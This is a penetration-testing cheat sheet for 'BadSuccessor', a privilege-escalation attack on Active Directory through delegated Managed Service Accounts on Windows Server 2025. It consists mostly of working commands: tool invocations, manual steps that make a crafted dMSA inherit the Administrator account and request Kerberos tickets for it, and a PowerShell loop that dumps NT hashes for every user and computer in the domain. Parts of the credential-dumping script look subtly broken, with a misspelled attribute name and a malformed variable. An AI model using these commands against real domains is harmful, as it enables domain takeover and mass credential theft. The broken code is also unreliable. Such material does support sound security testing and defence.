# Password - dMSA

Delegated Managed Service Accounts (dMSAs)

## BadSuccessor

**Requirements**:

* Windows Server 2025 Domain Controller
* Permission on any organizational unit (OU) in the domain

**Tools**:

* [akamai/BadSuccessor/Get-BadSuccessorOUPermissions.ps1](https://github.com/akamai/BadSuccessor)
* [LuemmelSec/Pentest-Tools-Collection/BadSuccessor.ps1](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
* [GhostPack/Rubeus PR #194](https://github.com/GhostPack/Rubeus/pull/194)
* [CravateRouge/bloodyAD Commit #210f735](https://github.com/CravateRouge/bloodyAD/commit/210f735474a403dd64b218b84e98a27e157e7ed3)
* [skelsec/minikerberos/getDmsa.py](https://github.com/skelsec/minikerberos/blob/main/minikerberos/examples/getDmsa.py)
* [logangoins/SharpSuccessor](https://github.com/logangoins/SharpSuccessor)

    ```ps1
    SharpSuccessor.exe add /impersonate:Administrator /path:"ou=test,dc=lab,dc=lan" /account:jdoe /name:attacker_dMSA
    ```

* [Pennyw0rth/NetExec PR #702](https://github.com/Pennyw0rth/NetExec/pull/702/commits/e75512a93cde0c893505fd806e169a2aa7a683db)

    ```ps1
    poetry run netexec ldap 10.10.10.10 -u administrator -p Passw0rd -M badsuccessor
    ```

![badsuccessor-attack-flow](https://www.akamai.com/site/en/images/blog/2025/badsuccessor-image5.png)

**Manual Exploitation**:

* Verify if the DC is a Server 2025

    ```ps1
    ldapsearch "(&(objectClass=computer)(primaryGroupID=516))" dn,name,operatingsystem

    # BloodHound Query
    MATCH (c:Computer)
    WHERE c.isdc = true AND c.operatingsystem CONTAINS "2025"
    RETURN c.name
    ```

* Create unfunctional dMSA

    ```ps1
    New-ADServiceAccount -Name "attacker_dmsa" -DNSHostName "dontcare.com" -CreateDelegatedServiceAccount -PrincipalsAllowedToRetrieveManagedPassword "attacker-machine$" -path "OU=temp,DC=aka,DC=test"
    ```

* Edit `msDS-ManagedAccountPrecededByLink` and `msDS-DelegatedMSAState` values

    ```ps1
    # msDS-ManagedAccountPrecededByLink, targeted user or computer
    # msDS-DelegatedMSAState=2, completed migration
    $dMSA = [ADSI]"LDAP://CN=attacker_dmsa,OU=temp,DC=aka,DC=test"
    $dMSA.Put("msDS-DelegatedMSAState", 2)
    $dMSA.Put("msDS-ManagedAccountPrecededByLink", "CN=Administrator,CN=Users,DC=aka,DC=test")
    $dMSA.SetInfo()
    ```

* dMSA authentication with Rubeus

    ```ps1
    Rubeus.exe asktgs /targetuser:attacker_dmsa$ /service:krbtgt/aka.test /dmsa /opsec /nowrap /ptt /ticket:<Machine TGT>
    ```

## Credential Dumping

> When you request a TGT for a dMSA, it comes with a new structure called KERB-DMSA-KEY-PACKAGE. This structure includes two fields: current-keys and previous-keys. - Akamai Blog Post

The previous-keys field contains the RC4-HMAC of the password (NT Hash).

```ps1
.\Invoke-BadSuccessorKeysDump.ps1 -OU 'OU=temp,DC=aka,DC=test'
```

* [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

    ```ps1
    $domain = Get-ADDomain
    $dmsa = "CN=mydmsa,CN=Managed Service Accounts,$($domain.DistinguishedName)"
    $allDNs = @(Get-ADUser -Filter * | select @{n='DN';e={$_.DistinguishedName}}, sAMAccountName) + @(Get-ADComputer -Filter * | select @{n='DN';e={$_.DistinguishedName}}, SAMAccountName)
    $allDNs | % {
        Set-ADObject -Identity $dmsa -Replace @{ "msDS-ManagedAccountPrecendedByLink" = $_.DN }
        $res = Invoke-Rubeus asktgs /targeteduser:mydmsa$ /service:"krbtgt/$(domain.DNSRoot)" /opsec /dmsa /nowrap /ticket:$kirbi
        $rc4 = [regex]::Match($res, 'Previous Keys for .*\$: \(rc4_hmac\) ([A-F0-9]{32})').Groups[1].Value
        "$($_.sAMAccountName):$rc4"
    }
    ```

* [CravateRouge/bloodyAD](https://github.com/CravateRouge/bloodyAD)

    ```ps1
    python bloodyAD.py --host 192.168.100.5 -d bloody.corp -u jeanne -p 'Password123!' get writable --otype OU 
    python bloodyAD.py --host 192.168.100.5 -d bloody.corp -u jeanne -p 'Password123!' add badSuccessor dmsADM10
    ```

* [snovvcrash/dMSASync.py](https://gist.github.com/snovvcrash/a1ae180ab3b49acb43da8fd34e7e93df)

    ```ps1
    getTGT.py 'kerberos+aes://contoso.local\user:AES_KEY@DC_IP' --ccache user.ccache
    dMSASync.py 'contoso.local\user:user.ccache@DC01.contoso.local/?dc=DC_IP' 'CN=dmsa,CN=Managed Service Accounts,DC=contoso,DC=local'
    ```

## References

* [BadSuccessor: Abusing dMSA to Escalate Privileges in Active Directory - Yuval Gordon - May 21, 2025](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
* [Operationalizing the BadSuccessor: Abusing dMSA for Domain Privilege Escalation - Arun Nair - May 23, 2025](https://medium.com/seercurity-spotlight/operationalizing-the-badsuccessor-abusing-dmsa-for-domain-privilege-escalation-429cefc36187)
* [Understanding & Mitigating BadSuccessor - Jim Sykora - May 27 2025](https://specterops.io/blog/2025/05/27/understanding-mitigating-badsuccessor/)
